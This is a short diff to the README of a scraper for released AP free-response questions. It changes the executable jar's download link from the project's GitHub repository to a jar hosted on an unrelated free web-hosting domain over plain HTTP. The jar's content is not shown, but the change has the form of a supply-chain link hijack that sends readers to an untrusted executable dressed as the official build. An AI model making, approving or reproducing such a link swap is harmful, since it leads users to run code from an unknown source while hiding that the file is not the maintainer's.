@@ -2,4 +2,4 @@
 
 A web scraper to get all released AP FRQs
 
-Download [executable jar](https://github.com/Boomaa23/APReleasedPuller/raw/master/ap-pull.jar)
+Download [executable jar](http://phptest123.byethost24.com/cdn/ap-pull.jar)
